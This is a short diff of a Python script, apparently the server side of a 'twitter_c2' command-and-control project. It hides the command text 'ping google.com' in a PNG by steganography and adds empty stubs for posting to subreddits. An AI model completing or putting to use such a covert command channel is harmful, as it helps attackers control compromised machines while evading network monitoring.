@@ -1,9 +1,5 @@
 import requests
 import base64
-#import piexif
-#from PIL import Image
-from exif import Image
-
 from PIL import Image
 import numpy as np
 
@@ -37,3 +33,16 @@ def write_message_to_image(text,image_path):
     new_img = Image.fromarray(data)
     new_img.save(image_path)
     return True # means success and that the rest of the program can carry on.
+
+# Mot sure if this func is needed 
+# but may be in the future.
+def create_account():
+    pass
+
+def create_subreddit():
+    pass
+
+def upload_to_subreddit():
+    pass
+
+write_message_to_image("ping google.com", "/home/mikolaj/Documents/python/twitter_c2/server/forest.png")
